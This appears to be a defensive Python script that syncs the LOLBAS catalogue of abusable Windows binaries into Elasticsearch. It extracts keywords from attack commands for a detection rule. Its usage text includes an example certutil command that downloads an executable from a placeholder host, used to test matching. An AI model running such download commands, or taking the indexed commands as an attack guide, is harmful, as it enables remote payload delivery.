#!/usr/bin/env python3
"""Download the LOLBAS list and load it into two Elasticsearch lookup indices.

  lolbas-binaries   one document per LOLBAS .exe (used for hunting and ML)
  lolbas-commands   one document per attack command, with up to three keywords
                    that the detection rule looks for in a process command line

Usage:
  python3 lolbas_sync.py --dry-run          # print what would be loaded, change nothing
  python3 lolbas_sync.py                    # download and load into Elasticsearch
  python3 lolbas_sync.py --file lolbas.json # use a file you downloaded yourself
  python3 lolbas_sync.py --match 'certutil.exe -urlcache -f http://x/a.exe a.exe'
                                            # show which LOLBAS commands a command line would match

Python 3.6+, standard library only.
"""
import argparse
import datetime
import hashlib
import json
import re
import signal
import sys
import urllib.request

from lolbas_common import BINARIES_INDEX, COMMANDS_INDEX, es, load_config

LOLBAS_URL = "https://lolbas-project.github.io/api/lolbas.json"
MAX_KEYWORDS = 3
MIN_KEYWORD_LENGTH = 3
# .exe is in basically every command line, useless as a keyword
WEAK_EXTENSIONS = {".exe"}


def download(url):
    with urllib.request.urlopen(url, timeout=60) as response:
        return json.loads(response.read().decode("utf-8"))


def base_name(token):
    """'C:\\Windows\\System32\\Certutil.exe' -> 'certutil.exe'; 'rundll32' -> 'rundll32.exe'."""
    name = token.strip("\"'").replace("/", "\\").split("\\")[-1].lower()
    if name and "." not in name:
        name += ".exe"
    return name


def replace_placeholders(command):
    """Turn LOLBAS placeholders into words a real command line would contain.

    {REMOTEURL:.sct} -> ' http .sct '     {PATH_SMB:.dll} -> ' \\\\ .dll '
    {PATH:.xml}      -> ' .xml '          {CMD}           -> ' '
    A literal example URL (https://example.com/a.exe) also becomes ' http '.
    """
    def swap(match):
        kind, _, hint = match.group(1).lower().partition(":")
        words = []
        if kind == "remoteurl":
            words.append("http")
        elif kind == "path_smb":
            words.append("\\\\")
        if re.fullmatch(r"\.[a-z0-9]{1,5}", hint) and hint not in WEAK_EXTENSIONS:
            words.append(hint)
        return " " + " ".join(words) + " "
    command = re.sub(r"\{([^{}]*)\}", swap, command)
    return re.sub(r"[a-z]+://\S*", " http ", command)


def pick_segment(command, entry_name, exe_names):
    """Find which program the command starts, and that program's own arguments.

    LOLBAS commands are sometimes chained ('a.exe ... & b.exe ...'). A process
    event only ever holds one program's command line, so use the first chained
    part that starts with the entry itself or with another LOLBAS .exe
    (for example rundll32.exe for a .dll entry). Returns (binary, arguments).
    """
    segments = [part.strip() for part in re.split(r"[&|]", command) if part.strip()]
    for segment in segments:
        first, _, rest = segment.partition(" ")
        name = base_name(first)
        if name == entry_name or name in exe_names:
            return name, rest
    # nothing starts with a known binary (ex: 'type file > share' is a cmd builtin)
    # so just treat the first chunk as args for the entry itself
    if entry_name.endswith(".exe") and segments:
        return entry_name, segments[0]
    return None, ""


def keywords(arguments, binary):
    """grab up to MAX_KEYWORDS useful words out of the args"""
    stem = binary.rsplit(".", 1)[0]
    text = replace_placeholders(arguments).replace("^", "")      # ^ is the cmd escape char
    found = []
    # split on spaces + punctuation that changes from one command line to the next
    for token in re.split(r"[\s\"'(),;=:<>@]+", text):
        if token != "\\\\":
            if "\\" in token or "%" in token:
                continue                                         # example path, skip
            token = token.lstrip("-/").rstrip(".")               # -urlcache and /urlcache both end up as urlcache
            if len(token) < MIN_KEYWORD_LENGTH or len(re.findall(r"[a-z]", token)) < 2:
                continue                                         # too short or just a number
        if token in (binary, stem) or token in found:
            continue
        found.append(token)
    found.sort(key=len, reverse=True)                            # longest = most specific
    return found[:MAX_KEYWORDS]


def build_documents(entries, synced_at):
    """returns (binary docs, command docs, skipped commands)"""
    exe_names = {e["Name"].lower() for e in entries if e["Name"].lower().endswith(".exe")}
    binaries, commands, skipped = {}, {}, []
    for entry in entries:
        entry_name = entry["Name"].lower()
        entry_commands = entry.get("Commands") or []
        if entry_name in exe_names:
            binaries[entry_name] = {
                "lolbas_name": entry_name,
                "lolbas_description": entry.get("Description", ""),
                "lolbas_categories": ", ".join(sorted({c.get("Category", "") for c in entry_commands})),
                "lolbas_mitre_ids": ", ".join(sorted({c.get("MitreID", "") for c in entry_commands})),
                "lolbas_url": entry.get("url", ""),
                "synced_at": synced_at,
            }
        for item in entry_commands:
            original = item.get("Command", "")
            binary, arguments = pick_segment(original.lower(), entry_name, exe_names)
            words = keywords(arguments, binary) if binary else []
            if not words:
                skipped.append((entry["Name"], original))
                continue
            doc = {
                "lolbas_name": binary,
                "lolbas_entry": entry["Name"],
                "lolbas_command": original,
                "lolbas_category": item.get("Category", ""),
                "lolbas_mitre_id": item.get("MitreID", ""),
                "lolbas_usecase": item.get("Usecase", ""),
                "lolbas_url": entry.get("url", ""),
                "lolbas_keyword_count": len(words),
                # payload comes from a url or smb share
                "lolbas_remote": "http" in words or "\\\\" in words,
                "synced_at": synced_at,
            }
            for position, word in enumerate(words, start=1):
                doc["lolbas_kw%d" % position] = word
            doc_id = hashlib.sha1((binary + "|" + original).encode("utf-8")).hexdigest()[:20]
            commands[doc_id] = doc
    return binaries, commands, skipped


def ensure_index(name, properties):
    status, _ = es("GET", "/" + name, ok=(200, 404))
    if status == 404:
        es("PUT", "/" + name, {
            "settings": {"index": {"mode": "lookup"}},   # LOOKUP JOIN needs this
            "mappings": {"properties": properties},
        })
        print("created index", name)


def load(index, documents, synced_at):
    lines = []
    for doc_id, doc in documents.items():
        lines.append(json.dumps({"index": {"_index": index, "_id": doc_id}}))
        lines.append(json.dumps(doc))
    _, result = es("POST", "/_bulk?refresh=true", "\n".join(lines) + "\n")
    if result.get("errors"):
        failed = [i["index"] for i in result["items"] if i["index"].get("error")]
        sys.exit("ERROR: %d documents were rejected by %s. First error:\n%s"
                 % (len(failed), index, json.dumps(failed[0], indent=2)))
    # drop anything lolbas removed since last run
    _, removed = es("POST", "/%s/_delete_by_query?refresh=true" % index,
                    {"query": {"range": {"synced_at": {"lt": synced_at}}}})
    print("%s: loaded %d, removed %d stale" % (index, len(documents), removed.get("deleted", 0)))


def main():
    if hasattr(signal, "SIGPIPE"):
        signal.signal(signal.SIGPIPE, signal.SIG_DFL)   # so piping to head doesnt throw
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--file", help="read LOLBAS JSON from this file instead of downloading it")
    parser.add_argument("--dry-run", action="store_true", help="print the result, do not touch Elasticsearch")
    parser.add_argument("--match", metavar="COMMAND_LINE",
                        help="show which LOLBAS commands this command line would match, do not touch Elasticsearch")
    args = parser.parse_args()

    if args.file:
        with open(args.file, encoding="utf-8") as handle:
            entries = json.load(handle)
    else:
        entries = download(LOLBAS_URL)
    synced_at = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    binaries, commands, skipped = build_documents(entries, synced_at)

    print("LOLBAS entries: %d   binaries (.exe): %d   commands with keywords: %d   skipped: %d"
          % (len(entries), len(binaries), len(commands), len(skipped)))

    if args.match:
        # same check the rule does: binary matches and every keyword is in the command line
        line = args.match.lower()
        binary = base_name(line.split()[0])
        hits = [d for d in commands.values() if d["lolbas_name"] == binary
                and all(d.get("lolbas_kw%d" % n, "") in line for n in (1, 2, 3))]
        print("\nbinary: %s   matching LOLBAS commands: %d" % (binary, len(hits)))
        for doc in hits:
            alerts = doc["lolbas_keyword_count"] >= 2 or doc["lolbas_remote"]
            print("  %-8s keywords=%d remote=%-5s %s [%s]  %s" % (
                "ALERT" if alerts else "no alert", doc["lolbas_keyword_count"], doc["lolbas_remote"],
                doc["lolbas_category"], doc["lolbas_mitre_id"], doc["lolbas_command"]))
        return

    if args.dry_run:
        print("\nbinary\tkeywords\toriginal command")
        for doc in sorted(commands.values(), key=lambda d: d["lolbas_name"]):
            words = [doc.get("lolbas_kw%d" % n) for n in (1, 2, 3) if doc.get("lolbas_kw%d" % n)]
            print("%s\t%s\t%s" % (doc["lolbas_name"], " | ".join(words), doc["lolbas_command"]))
        print("\nSKIPPED (no usable keyword, so the command cannot be told apart from normal use):")
        for name, original in skipped:
            print("%s\t%s" % (name, original))
        return

    load_config()
    keyword = {"type": "keyword"}
    ensure_index(BINARIES_INDEX, {
        "lolbas_name": keyword, "lolbas_description": keyword, "lolbas_categories": keyword,
        "lolbas_mitre_ids": keyword, "lolbas_url": keyword, "synced_at": {"type": "date"},
    })
    ensure_index(COMMANDS_INDEX, {
        "lolbas_name": keyword, "lolbas_entry": keyword, "lolbas_command": keyword,
        "lolbas_category": keyword, "lolbas_mitre_id": keyword, "lolbas_usecase": keyword,
        "lolbas_url": keyword, "lolbas_kw1": keyword, "lolbas_kw2": keyword, "lolbas_kw3": keyword,
        "lolbas_keyword_count": {"type": "integer"}, "lolbas_remote": {"type": "boolean"},
        "synced_at": {"type": "date"},
    })
    load(BINARIES_INDEX, binaries, synced_at)
    load(COMMANDS_INDEX, commands, synced_at)


if __name__ == "__main__":
    main()
